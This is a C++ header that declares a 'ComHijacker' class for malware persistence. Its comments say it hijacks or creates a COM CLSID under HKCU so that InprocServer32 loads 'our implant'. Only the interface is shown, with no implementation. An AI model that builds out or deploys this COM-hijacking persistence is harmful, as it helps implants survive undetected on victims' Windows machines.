#pragma once
#include <windows.h>
#include <string>

namespace persistence {

class ComHijacker {
public:
    // Hijacks a common CLSID or creates a new one in HKCU
    // to point InprocServer32 to our implant.
    static bool Install(const std::wstring& implantPath, const std::wstring& clsid);

    static bool Uninstall(const std::wstring& clsid);
};

} // namespace persistence
